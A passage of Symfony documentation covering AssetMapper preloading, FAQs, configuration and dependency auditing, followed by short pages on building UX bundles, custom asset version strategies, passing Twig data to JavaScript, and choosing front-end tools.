
- ``assets/app.js`` imports ``./duck.js``
- ``assets/duck.js`` imports ``bootstrap``

Without preloading, when the browser downloads the page, the following would happen:

1. The browser downloads ``assets/app.js``;
2. It *then* sees the ``./duck.js`` import and downloads ``assets/duck.js``;
3. It *then* sees the ``bootstrap`` import and downloads ``assets/bootstrap.js``.

Instead of downloading all 3 files in parallel, the browser would be forced to
download them one-by-one as it discovers them. That would hurt performance.

AssetMapper avoids this problem by outputting "preload" ``link`` tags.
The logic works like this:

**A) When you call ``importmap('app')`` in your template**, the AssetMapper component
looks at the ``assets/app.js`` file and finds all of the JavaScript files
that it imports or files that those files import, etc.

**B) It then outputs a ``link`` tag** for each of those files with a ``rel="preload"``
attribute. This tells the browser to start downloading those files immediately,
even though it hasn't yet seen the ``import`` statement for them.

Additionally, if the :doc:`WebLink Component </web_link>` is available in your application,
Symfony will add a ``Link`` header in the response to preload the CSS files.

Frequently Asked Questions
--------------------------

Does the AssetMapper Component Combine Assets?
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Nope! But that's because this is no longer necessary!

In the past, it was common to combine assets to reduce the number of HTTP
requests that were made. Thanks to advances in web servers like
HTTP/2, it's typically not a problem to keep your assets separate and let the
browser download them in parallel. In fact, by keeping them separate, when
you update one asset, the browser can continue to use the cached version of
all of your other assets.

See :ref:`Optimization <optimization>` for more details.

Does the AssetMapper Component Minify Assets?
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Nope! Minifying or compressing assets *is* important, but can be
done by your web server or a service like Cloudflare. See
:ref:`Optimization <optimization>` for more details.

Is the AssetMapper Component Production Ready? Is it Performant?
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Yes! Very! The AssetMapper component leverages advances in browser technology (like
importmaps and native ``import`` support) and web servers (like HTTP/2, which allows
assets to be downloaded in parallel). See the other questions about minimization
and combination and :ref:`Optimization <optimization>` for more details.

The https://ux.symfony.com site runs on the AssetMapper component and has a 99%
Google Lighthouse score.

Does the AssetMapper Component work in All Browsers?
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Yes! Features like importmaps and the ``import`` statement are supported
in all modern browsers, but the AssetMapper component ships with an `ES module shim`_
to support ``importmap`` in old browsers. So, it works everywhere (see note
below).

Inside your own code, if you're relying on modern `ES6`_ JavaScript features
like the `class syntax`_, this is supported in all but the oldest browsers.
If you *do* need to support very old browsers, you should use a tool like
:ref:`Encore <frontend-webpack-encore>` instead of the AssetMapper component.

.. note::

    The `import statement`_ can't be polyfilled or shimmed to work on *every*
    browser. However, only the **oldest** browsers don't support it - basically
    IE 11 (which is no longer supported by Microsoft and has less than .4%
    of global usage).

    The ``importmap`` feature **is** shimmed to work in **all** browsers by the
    AssetMapper component. However, the shim doesn't work with "dynamic" imports:

    .. code-block:: javascript

        // this works
        import { add } from './math.js';

        // this will not work in the oldest browsers
        import('./math.js').then(({ add }) => {
            // ...
        });

    If you want to use dynamic imports and need to support certain older browsers
    (https://caniuse.com/import-maps), you can use an ``importShim()`` function
    from the shim: https://www.npmjs.com/package/es-module-shims#user-content-polyfill-edge-case-dynamic-import

Can I Use it with Sass or Tailwind?
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sure! See :ref:`Using Tailwind CSS <asset-mapper-tailwind>` or :ref:`Using Sass <asset-mapper-sass>`.

Can I Use it with TypeScript?
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sure! See :ref:`Using TypeScript <asset-mapper-ts>`.

Can I Use it with JSX or Vue?
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Probably not. And if you're writing an application in React, Svelte or another
frontend framework, you'll probably be better off using *their* tools directly.

JSX *can* be compiled directly to a native JavaScript file but if you're using a lot of JSX,
you'll probably want to use a tool like :ref:`Encore <frontend-webpack-encore>`.
See the `UX React Documentation`_ for more details about using it with the AssetMapper
component.

Vue files *can* be written in native JavaScript, and those *will* work with
the AssetMapper component. But you cannot write single-file components (i.e. ``.vue``
files) with component, as those must be used in a build system. See the
`UX Vue.js Documentation`_ for more details about using with the AssetMapper
component.

.. _asset-mapper-ts:

Using TypeScript
----------------

To use TypeScript with the AssetMapper component, check out `sensiolabs/typescript-bundle`_.

Third-Party Bundles & Custom Asset Paths
----------------------------------------

All bundles that have a ``Resources/public/`` or ``public/`` directory will
automatically have that directory added as an "asset path", using the namespace:
``bundles/<BundleName>``. For example, if you're using `BabdevPagerfantaBundle`_
and you run the ``debug:asset-map`` command, you'll see an asset whose logical
path is ``bundles/babdevpagerfanta/css/pagerfanta.css``.

This means you can render these assets in your templates using the
``asset()`` function:

.. code-block:: html+twig

    <link rel="stylesheet" href="{{ asset('bundles/babdevpagerfanta/css/pagerfanta.css') }}">

Actually, this path - ``bundles/babdevpagerfanta/css/pagerfanta.css`` - already
works in applications *without* the AssetMapper component, because the ``assets:install``
command copies the assets from bundles into ``public/bundles/``. However, when
the AssetMapper component is enabled, the ``pagerfanta.css`` file will automatically
be versioned! It will output something like:

.. code-block:: html+twig

    <link rel="stylesheet" href="/assets/bundles/babdevpagerfanta/css/pagerfanta-ea64fc9c55f8394e696554f8aeb81a8e.css">

Overriding 3rd-Party Assets
~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you want to override a 3rd-party asset, you can do that by creating a
file in your ``assets/`` directory with the same name. For example, if you
want to override the ``pagerfanta.css`` file, create a file at
``assets/bundles/babdevpagerfanta/css/pagerfanta.css``. This file will be
used instead of the original file.

.. note::

    If a bundle renders their *own* assets, but they use a non-default
    :ref:`asset package <asset-packages>`, then the AssetMapper component will
    not be used. This happens, for example, with `EasyAdminBundle`_.

Importing Assets Outside of the ``assets/`` Directory
-----------------------------------------------------

You *can* import assets that live outside of your asset path
(i.e. the ``assets/`` directory). For example:

.. code-block:: css

    /* assets/styles/app.css */

    /* you can reach above assets/ */
    @import url('../../vendor/babdev/pagerfanta-bundle/Resources/public/css/pagerfanta.css');

However, if you get an error like this:

    The "app" importmap entry contains the path "vendor/some/package/assets/foo.js"
    but it does not appear to be in any of your asset paths.

It means that you're pointing to a valid file, but that file isn't in any of
your asset paths. You can fix this by adding the path to your ``asset_mapper.yaml``
file:

.. code-block:: yaml

    # config/packages/asset_mapper.yaml
    framework:
        asset_mapper:
            paths:
                - assets/
                - vendor/some/package/assets

Then try the command again.

Configuration Options
---------------------

You can see every available configuration options and some info by running:

.. code-block:: terminal

    $ php bin/console config:dump framework asset_mapper

Some of the more important options are described below.

``framework.asset_mapper.paths``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This config holds all of the directories that will be scanned for assets. This
can be a simple list:

.. code-block:: yaml

    framework:
        asset_mapper:
            paths:
                - assets/
                - vendor/some/package/assets

Or you can give each path a "namespace" that will be used in the asset map:

.. code-block:: yaml

    framework:
        asset_mapper:
            paths:
                assets/: ''
                vendor/some/package/assets/: 'some-package'

In this case, the "logical path" to all of the files in the ``vendor/some/package/assets/``
directory will be prefixed with ``some-package`` - e.g. ``some-package/foo.js``.

.. _excluded_patterns:

``framework.asset_mapper.excluded_patterns``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This is a list of glob patterns that will be excluded from the asset map:

.. code-block:: yaml

    framework:
        asset_mapper:
            excluded_patterns:
                - '*/*.scss'

You can use the ``debug:asset-map`` command to double-check that the files
you expect are being included in the asset map.

``framework.asset_mapper.exclude_dotfiles``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Whether to exclude any file starting with a ``.`` from the asset mapper. This
is useful if you want to avoid leaking sensitive files like ``.env`` or
``.gitignore`` in the files published by the asset mapper.

.. code-block:: yaml

    framework:
        asset_mapper:
            exclude_dotfiles: true

This option is enabled by default.

.. _config-importmap-polyfill:

``framework.asset_mapper.importmap_polyfill``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Configure the polyfill for older browsers. By default, the `ES module shim`_ is loaded
via a CDN (i.e. the default value for this setting is `es-module-shims`):

.. code-block:: yaml

    framework:
        asset_mapper:
            # set this option to false to disable the shim entirely
            # (your website/web app won't work in old browsers)
            importmap_polyfill: false

            # you can also use a custom polyfill by adding it to your importmap.php file
            # and setting this option to the key of that file in the importmap.php file
            # importmap_polyfill: 'custom_polyfill'

.. tip::

    You can tell the AssetMapper to load the `ES module shim`_ locally by
    using the following command, without changing your configuration:

    .. code-block:: terminal

        $ php bin/console importmap:require es-module-shims

``framework.asset_mapper.importmap_script_attributes``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This is a list of attributes that will be added to the ``<script>`` tags
rendered by the ``{{ importmap() }}`` Twig function:

.. code-block:: yaml

    framework:
        asset_mapper:
            importmap_script_attributes:
                crossorigin: 'anonymous'

Page-Specific CSS & JavaScript
------------------------------

Sometimes you may choose to include CSS or JavaScript files only on certain
pages. For JavaScript, an easy way is to load the file with a `dynamic import`_:

.. code-block:: javascript

    const someCondition = '...';
    if (someCondition) {
        import('./some-file.js');

        // or use async/await
        // const something = await import('./some-file.js');
    }

Another option is to create a separate :ref:`entrypoint <app-entrypoint>`. For
example, create a ``checkout.js`` file that contains whatever JavaScript and
CSS you need:

.. code-block:: javascript

    // assets/checkout.js
    import './checkout.css';

    // ...

Next, add this to ``importmap.php`` and mark it as an entrypoint::

    // importmap.php
    return [
        // the 'app' entrypoint ...

        'checkout' => [
            'path' => './assets/checkout.js',
            'entrypoint' => true,
        ],
    ];

Finally, on the page that needs this JavaScript, call ``importmap()`` and pass
both ``app`` and ``checkout``:

.. code-block:: twig

    {# templates/products/checkout.html.twig #}
    {#
        Override an "importmap" block from base.html.twig.
        If you don't have that block, add it around the {{ importmap('app') }} call.
    #}
    {% block importmap %}
        {# do NOT call parent() #}

        {{ importmap(['app', 'checkout']) }}
    {% endblock %}

By passing both ``app`` and ``checkout``, the ``importmap()`` function will
output the ``importmap`` and also add a ``<script type="module">`` tag that
loads the ``app.js`` file *and* the ``checkout.js`` file. It's important
to *not* call ``parent()`` in the ``importmap`` block. Each page can only
have *one* importmap, so ``importmap()`` must be called exactly once.

If, for some reason, you want to execute *only* ``checkout.js``
and *not* ``app.js``, pass only ``checkout`` to ``importmap()``.

The AssetMapper Component Caching System in dev
-----------------------------------------------

When developing your app in debug mode, the AssetMapper component will calculate the
content of each asset file and cache it. Whenever that file changes, the component
will automatically re-calculate the content.

The system also accounts for "dependencies": If ``app.css`` contains
``@import url('other.css')``, then the ``app.css`` file contents will also be
re-calculated whenever ``other.css`` changes. This is because the version hash of ``other.css``
will change... which will cause the final content of ``app.css`` to change, since
it includes the final ``other.css`` filename inside.

Mostly, this system just works. But if you have a file that is not being
re-calculated when you expect it to, you can run:

.. code-block:: terminal

    $ php bin/console cache:clear

This will force the AssetMapper component to re-calculate the content of all files.

Run Security Audits on Your Dependencies
----------------------------------------

Similar to ``npm``, the AssetMapper component comes bundled with a
command that checks security vulnerabilities in the dependencies of your application:

.. code-block:: terminal

    $ php bin/console importmap:audit

    --------  ---------------------------------------------  ---------  -------  ----------  -----------------------------------------------------
    Severity  Title                                          Package    Version  Patched in  More info
    --------  ---------------------------------------------  ---------  -------  ----------  -----------------------------------------------------
    Medium    jQuery Cross Site Scripting vulnerability      jquery     3.3.1    3.5.0       https://api.github.com/advisories/GHSA-257q-pV89-V3xv
    High      Prototype Pollution in JSON5 via Parse Method  json5      1.0.0    1.0.2       https://api.github.com/advisories/GHSA-9c47-m6qq-7p4h
    Medium    semver vulnerable to RegExp Denial of Service  semver     4.3.0    5.7.2       https://api.github.com/advisories/GHSA-c2qf-rxjj-qqgw
    Critical  Prototype Pollution in minimist                minimist   1.1.3    1.2.6       https://api.github.com/advisories/GHSA-xvch-5gv4-984h
    Medium    ESLint dependencies are vulnerable             minimist   1.1.3    1.2.2       https://api.github.com/advisories/GHSA-7fhm-mqm4-2wp7
    Medium    Bootstrap Vulnerable to Cross-Site Scripting   bootstrap  4.1.3    4.3.1       https://api.github.com/advisories/GHSA-9v3M-8fp8-mi99
    --------  ---------------------------------------------  ---------  -------  ----------  -----------------------------------------------------

    7 packages found: 7 audited / 0 skipped
    6 vulnerabilities found: 1 Critical / 1 High / 4 Medium

The command will return the ``0`` exit code if no vulnerability is found, or
the ``1`` exit code otherwise. This means that you can seamlessly integrate this
command as part of your CI to be warned anytime a new vulnerability is found.

.. tip::

    The command takes a ``--format`` option to choose the output format between
    ``txt`` and ``json``.

.. _latest asset-mapper recipe: https://github.com/symfony/recipes/tree/main/symfony/asset-mapper
.. _import statement: https://caniuse.com/es6-module-dynamic-import
.. _ES6: https://caniuse.com/es6
.. _npm package: https://www.npmjs.com
.. _importmap: https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap
.. _bootstrap: https://www.npmjs.com/package/bootstrap
.. _ES module shim: https://www.npmjs.com/package/es-module-shims
.. _highlight.js: https://www.npmjs.com/package/highlight.js
.. _class syntax: https://caniuse.com/es6-class
.. _UX React Documentation: https://symfony.com/bundles/ux-react/current/index.html
.. _UX Vue.js Documentation: https://symfony.com/bundles/ux-vue/current/index.html
.. _auto minify: https://developers.cloudflare.com/support/speed/optimization-file-size/using-cloudflare-auto-minify/
.. _Lighthouse: https://developers.google.com/web/tools/lighthouse
.. _Tailwind: https://tailwindcss.com/
.. _BabdevPagerfantaBundle: https://github.com/BabDev/PagerfantaBundle
.. _Cloudflare: https://www.cloudflare.com/
.. _EasyAdminBundle: https://github.com/EasyCorp/EasyAdminBundle
.. _symfonycasts/tailwind-bundle: https://symfony.com/bundles/TailwindBundle/current/index.html
.. _symfonycasts/sass-bundle: https://symfony.com/bundles/SassBundle/current/index.html
.. _sensiolabs/typescript-bundle: https://github.com/sensiolabs/AssetMapperTypeScriptBundle
.. _`dist/css/bootstrap.min.css file`: https://www.jsdelivr.com/package/npm/bootstrap?tab=files&path=dist%2Fcss#tabRouteFiles
.. _`dynamic import`: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/import
.. _`package.json configuration file`: https://docs.npmjs.com/creating-a-package-json-file
Create a UX bundle
==================

.. tip::

    Before reading this, you may want to have a look at
    :doc:`Best Practices for Reusable Bundles </bundles/best_practices>`.

Here are a few tricks to make your bundle install as a UX bundle.

composer.json file
------------------

Your ``composer.json`` file must have the ``symfony-ux`` keyword:

.. code-block:: json

    {
        "keywords": ["symfony-ux"]
    }

Assets location
---------------

Your assets must be located in one of the following directories, with a
``package.json`` file so Flex can handle it during install/update:

* ``/assets`` (recommended)
* ``/Resources/assets``
* ``/src/Resources/assets``

package.json file
-----------------

Your ``package.json`` file must contain a ``symfony`` config with controllers defined,
and also add required packages to the ``peerDependencies`` and ``importmap`` (the list
of packages in ``importmap`` should be the same as the ones in ``peerDependencies``):

.. code-block:: json

    {
        "name": "@acme/feature",
        "version": "1.0.0",
        "symfony": {
            "controllers": {
                "slug": {
                    "main": "dist/controller.js",
                    "fetch": "eager",
                    "enabled": true,
                    "autoimport": {
                        "@acme/feature/dist/bootstrap4-theme.css": false,
                        "@acme/feature/dist/bootstrap5-theme.css": true
                    }
                }
            },
            "importmap": {
                "@hotwired/stimulus": "^3.0.0",
                "slugify": "^1.6.5"
            }
        },
        "peerDependencies": {
            "@hotwired/stimulus": "^3.0.0",
            "slugify": "^1.6.5"
        }
    }

In this case, the file located at ``[assets directory]/dist/controller.js`` will be exposed.

.. tip::

    You can either write raw JS in this ``dist/controller.js`` file, or you can
    e.g. write your controller with TypeScript and transpile it to JavaScript.

    Here is an example to do so:

    1. Add the following to your ``package.json`` file:

       .. code-block:: json

           {
               "scripts": {
                   "build": "babel src --extensions .ts -d dist"
               },
               "devDependencies": {
                   "@babel/cli": "^7.20.7",
                   "@babel/core": "^7.20.12",
                   "@babel/plugin-proposal-class-properties": "^7.18.6",
                   "@babel/preset-env": "^7.20.2",
                   "@babel/preset-typescript": "^7.18.6",
                   "@hotwired/stimulus": "^3.2.1",
                   "typescript": "^4.9.5"
               }
           }

    2. Add the following to your ``babel.config.js`` file (should be located next
       to your ``package.json`` file):

       .. code-block:: javascript

           module.exports = {
               presets: [
                   ['@babel/preset-env', {
                       "loose": true,
                       "modules": false
                   }],
                   ['@babel/preset-typescript', { allowDeclareFields: true }]
               ],
               assumptions: {
                   superIsCallableConstructor: false,
               },
           };

    3. Run ``npm install`` to install the new dependencies.

    4. Write your Stimulus controller with TypeScript in ``src/controller.ts``.

    5. Run ``npm run build`` to transpile your TypeScript controller into JavaScript.

To use your controller in a template (e.g. one defined in your bundle) you can use it like this:

.. code-block:: html+twig

    <div
        {{ stimulus_controller('acme/feature/slug', { modal: 'my-value' }) }}
        {#
            will render:
            data-controller="acme--feature--slug"
            data-acme--feature--slug-modal-value="my-value"
        #}
    >
        ...
    </div>

Don't forget to add ``symfony/stimulus-bundle:^2.9`` as a composer dependency to use
Twig ``stimulus_*`` functions.

.. tip::

    Controller Naming: In this example, the ``name`` of the PHP package is ``acme/feature`` and the name
    of the controller in ``package.json`` is ``slug``. So, the full controller name for Stimulus will be
    ``acme--feature--slug``, though with the ``stimulus_controller()`` function, you can use ``acme/feature/slug``.

Each controller has a number of options in ``package.json`` file:

==================  ====================================================================================================
Option              Description
==================  ====================================================================================================
enabled             Whether the controller should be enabled by default.
main                Path to the controller file.
fetch               How controller & dependencies are included when the page loads.
                    Use ``eager`` (default) to make controller & dependencies included in the JavaScript that's
                    downloaded when the page is loaded.
                    Use ``lazy`` to make controller & dependencies isolated into a separate file and only downloaded
                    asynchronously if (and when) the data-controller HTML appears on the page.
autoimport          List of files to be imported with the controller. Useful e.g. when there are several CSS styles
                    depending on the frontend framework used (like Bootstrap 4 or 5, Tailwind CSS...).
                    The value must be an object with files as keys, and a boolean as value for each file to set
                    whether the file should be imported.
==================  ====================================================================================================

Specifics for Asset Mapper
--------------------------

To make your bundle's assets work with AssetMapper, you must add the ``importmap``
config like above in your ``package.json`` file, and prepend some configuration
to the container::

    namespace Acme\FeatureBundle;

    use Symfony\Component\AssetMapper\AssetMapperInterface;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Loader\Configurator\ContainerConfigurator;
    use Symfony\Component\HttpKernel\Bundle\AbstractBundle;

    class AcmeFeatureBundle extends AbstractBundle
    {
        public function prependExtension(ContainerConfigurator $configurator, ContainerBuilder $container): void
        {
            if (!$this->isAssetMapperAvailable($container)) {
                return;
            }

            $container->prependExtensionConfig('framework', [
                'asset_mapper' => [
                    'paths' => [
                        __DIR__ . '/../assets/dist' => '@acme/feature-bundle',
                    ],
                ],
            ]);
        }

        private function isAssetMapperAvailable(ContainerBuilder $container): bool
        {
            if (!interface_exists(AssetMapperInterface::class)) {
                return false;
            }

            // check that FrameworkBundle 6.3 or higher is installed
            $bundlesMetadata = $container->getParameter('kernel.bundles_metadata');
            if (!isset($bundlesMetadata['FrameworkBundle'])) {
                return false;
            }

            return is_file($bundlesMetadata['FrameworkBundle']['path'] . '/Resources/config/asset_mapper.php');
        }
    }
How to Use a Custom Version Strategy for Assets
===============================================

Asset versioning is a technique that improves the performance of web
applications by adding a version identifier to the URL of the static assets
(CSS, JavaScript, images, etc.) When the content of the asset changes, its
identifier is also modified to force the browser to download it again instead of
reusing the cached asset.

If your application requires advanced versioning, such as generating the
version dynamically based on some external information, you can create your
own version strategy.

.. note::

    Symfony provides various cache busting implementations via the
    :ref:`version <reference-framework-assets-version>`,
    :ref:`version_format <reference-assets-version-format>`, and
    :ref:`json_manifest_path <reference-assets-json-manifest-path>`
    configuration options.

Creating your Own Asset Version Strategy
----------------------------------------

The following example shows how to create a version strategy compatible with
`gulp-buster`_. This tool defines a configuration file called ``busters.json``
which maps each asset file to its content hash:

.. code-block:: json

    {
        "js/script.js": "f9c7afd05729f10f55b689f36bb20172",
        "css/style.css": "91cd067f79a5839536b46c494c4272d8"
    }

Implement VersionStrategyInterface
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Asset version strategies are PHP classes that implement the
:class:`Symfony\\Component\\Asset\\VersionStrategy\\VersionStrategyInterface`.
In this example, the constructor of the class takes as arguments the path to
the manifest file generated by `gulp-buster`_ and the format of the generated
version string::

    // src/Asset/VersionStrategy/GulpBusterVersionStrategy.php
    namespace App\Asset\VersionStrategy;

    use Symfony\Component\Asset\VersionStrategy\VersionStrategyInterface;

    class GulpBusterVersionStrategy implements VersionStrategyInterface
    {
        private string $format;

        /**
         * @var string[]
         */
        private array $hashes;

        public function __construct(
            private string $manifestPath,
            ?string $format = null,
        ) {
            $this->format = $format ?: '%s?%s';
        }

        public function getVersion(string $path): string
        {
            if (!is_array($this->hashes)) {
                $this->hashes = $this->loadManifest();
            }

            return $this->hashes[$path] ?? '';
        }

        public function applyVersion(string $path): string
        {
            $version = $this->getVersion($path);

            if ('' === $version) {
                return $path;
            }

            return sprintf($this->format, $path, $version);
        }

        private function loadManifest(): array
        {
            return json_decode(file_get_contents($this->manifestPath), true);
        }
    }

Register the Strategy Service
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

After creating the strategy PHP class, register it as a Symfony service.

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Asset\VersionStrategy\GulpBusterVersionStrategy:
                arguments:
                    - "%kernel.project_dir%/busters.json"
                    - "%%s?version=%%s"

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd"
        >
            <services>
                <service id="App\Asset\VersionStrategy\GulpBusterVersionStrategy">
                    <argument>%kernel.project_dir%/busters.json</argument>
                    <argument>%%s?version=%%s</argument>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Asset\VersionStrategy\GulpBusterVersionStrategy;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(GulpBusterVersionStrategy::class)
                ->args(
                    [
                        '%kernel.project_dir%/busters.json',
                        '%%s?version=%%s',
                    ]
                );
        };

Finally, enable the new asset versioning for all the application assets or just
for some :ref:`asset package <reference-framework-assets-packages>` thanks to
the :ref:`version_strategy <reference-assets-version-strategy>` option:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            # ...
            assets:
                version_strategy: 'App\Asset\VersionStrategy\GulpBusterVersionStrategy'

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:assets version-strategy="App\Asset\VersionStrategy\GulpBusterVersionStrategy"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use App\Asset\VersionStrategy\GulpBusterVersionStrategy;
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $framework->assets()
                ->versionStrategy(GulpBusterVersionStrategy::class)
            ;
        };

.. _`gulp-buster`: https://www.npmjs.com/package/gulp-buster
Passing Information from Twig to JavaScript
===========================================

In Symfony applications, you may find that you need to pass some dynamic data
(e.g. user information) from Twig to your JavaScript code. One great way to pass
dynamic configuration is by storing information in ``data-*`` attributes and reading
them later in JavaScript. For example:

.. code-block:: html+twig

    <div class="js-user-rating"
        data-is-authenticated="{{ app.user ? 'true' : 'false' }}"
        data-user="{{ app.user|serialize(format = 'json') }}"
    >
        <!-- ... -->
    </div>

Fetch this in JavaScript:

.. code-block:: javascript

    document.addEventListener('DOMContentLoaded', function() {
        const userRating = document.querySelector('.js-user-rating');
        const isAuthenticated = userRating.getAttribute('data-is-authenticated');
        const user = JSON.parse(userRating.getAttribute('data-user'));
    });

.. note::

    If you prefer to `access data attributes via JavaScript's dataset property`_,
    the attribute names are converted from dash-style to camelCase. For example,
    ``data-number-of-reviews`` becomes ``dataset.numberOfReviews``:

    .. code-block:: javascript

        // ...
        const isAuthenticated = userRating.dataset.isAuthenticated;
        const user = JSON.parse(userRating.dataset.user);

There is no size limit for the value of the ``data-*`` attributes, so you can
store any content. In Twig, use the ``html_attr`` escaping strategy to avoid messing
with HTML attributes. For example, if your ``User`` object has some ``getProfileData()``
method that returns an array, you could do the following:

.. code-block:: html+twig

    <div data-user-profile="{{ app.user ? app.user.profileData|json_encode|e('html_attr') }}">
        <!-- ... -->
    </div>

.. _`access data attributes via JavaScript's dataset property`: https://developer.mozilla.org/en-US/docs/Learn/HTML/Howto/Use_data_attributes
Front-end Tools: Handling CSS & JavaScript
==========================================

Symfony gives you the flexibility to choose any front-end tools you want. There
are generally two approaches:

#. :ref:`building your HTML with PHP & Twig <frontend-twig-php>`;
#. :ref:`building your frontend with a JavaScript framework <frontend-js>` like React, Vue, Svelte, etc.

Both work great - and are discussed below.

.. _frontend-twig-php:

Using PHP & Twig
----------------

Symfony comes with two powerful options to help you build a modern and fast frontend:

* :ref:`AssetMapper <frontend-asset-mapper>` (recommended for new projects) runs
  entirely in PHP, doesn't require any build step and leverages modern web standards.

* :ref:`Webpack Encore <frontend-webpack-encore>` is built with `Node.js`_
  on top of `Webpack`_.

================================  ==================================  ==========
                                  AssetMapper                         Encore
================================  ==================================  ==========
Production Ready?                 yes                                 yes
Stable?                           yes                                 yes
Requirements                      none                                Node.js
Requires a build step?            no                                  yes
Works in all browsers?            yes                                 yes
Supports `Stimulus/UX`_           yes                                 yes
Supports Sass/Tailwind            :ref:`yes <asset-mapper-tailwind>`  yes
Supports React, Vue, Svelte?      yes :ref:`[1] <ux-note-1>`          yes
Supports TypeScript               :ref:`yes <asset-mapper-ts>`        yes
Removes comments from JavaScript  no                                  yes
Removes comments from CSS         no                                  no
Versioned assets                  always                              optional
Can update 3rd party packages     yes                                 no :ref:`[2] <ux-note-2>`
================================  ==================================  ==========

.. _ux-note-1:

**[1]** Using JSX (React), Vue, etc with AssetMapper is possible, but you'll
need to use their native tools for pre-compilation. Also, some features (like
Vue single-file components) cannot be compiled down to pure JavaScript that can
be executed by a browser.

.. _ux-note-2:

**[2]** If you use ``npm``, there are update checkers available (e.g. ``npm-check``).

.. _frontend-asset-mapper:

AssetMapper (Recommended)
~~~~~~~~~~~~~~~~~~~~~~~~~

AssetMapper is the recommended system for handling your assets. It runs entirely
in PHP with no complex build step or dependencies. It does this by leveraging
the ``importmap`` feature of your browser, which is available in all browsers thanks
to a polyfill.

:doc:`Read the AssetMapper Documentation </frontend/asset_mapper>`

.. _frontend-webpack-encore:

Webpack Encore
~~~~~~~~~~~~~~

.. screencast::

    Do you prefer video tutorials? Check out the `Webpack Encore screencast series`_.

`Webpack Encore`_ is a simpler way to integrate `Webpack`_ into your application.
It wraps Webpack, giving you a clean & powerful API for bundling JavaScript modules,
pre-processing CSS & JS and compiling and minifying assets.

:doc:`Read the Encore Documentation </frontend/encore/index>`

Switch from AssetMapper
^^^^^^^^^^^^^^^^^^^^^^^

By default, new Symfony webapp projects (created with ``symfony new --webapp myapp``)
use AssetMapper. If you still need to use Webpack Encore, use the following steps to
switch. This is best done on a new project and provides the same features (Turbo/Stimulus)
as the default webapp.

.. code-block:: terminal

    # Remove AssetMapper & Turbo/Stimulus temporarily
    $ composer remove symfony/ux-turbo symfony/asset-mapper symfony/stimulus-bundle

    # Add Webpack Encore & Turbo/Stimulus back
    $ composer require symfony/webpack-encore-bundle symfony/ux-turbo symfony/stimulus-bundle

    # Install & Build Assets
    $ npm install
    $ npm run dev

Stimulus & Symfony UX Components
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Once you've installed AssetMapper or Webpack Encore, it's time to start building your
front-end. You can write your JavaScript however you want, but we recommend
using `Stimulus`_, `Turbo`_ and a set of tools called `Symfony UX`_.

To learn about Stimulus & the UX Components, see
the `StimulusBundle Documentation`_

.. _frontend-js:

Using a Front-end Framework (React, Vue, Svelte, etc)
-----------------------------------------------------

If you want to use a front-end framework (Next.js, React, Vue, Svelte, etc),
we recommend using their native tools and using Symfony as a pure API. A wonderful
tool to do that is `API Platform`_. Their standard distribution comes with a
Symfony-powered API backend, frontend scaffolding in Next.js (other frameworks
are also supported) and a React admin interface. It comes fully Dockerized and even
contains a web server.

Other Front-End Articles
------------------------

* :doc:`/frontend/create_ux_bundle`
* :doc:`/frontend/custom_version_strategy`
* :doc:`/frontend/server-data`

.. _`Webpack Encore`: https://www.npmjs.com/package/@symfony/webpack-encore
.. _`Webpack`: https://webpack.js.org/
.. _`Node.js`: https://nodejs.org/
.. _`Webpack Encore screencast series`: https://symfonycasts.com/screencast/webpack-encore
.. _`StimulusBundle Documentation`: https://symfony.com/bundles/StimulusBundle/current/index.html
.. _`Stimulus/UX`: https://symfony.com/bundles/StimulusBundle/current/index.html
.. _`Stimulus`: https://stimulus.hotwired.dev/
.. _`Turbo`: https://turbo.hotwired.dev/
.. _`Symfony UX`: https://ux.symfony.com
.. _`API Platform`: https://api-platform.com/
Getting Started
---------------

.. toctree::
    :maxdepth: 1

    /setup
    /page_creation
    /routing
    /controller
    /templates
    /configuration
HTML Sanitizer
==============

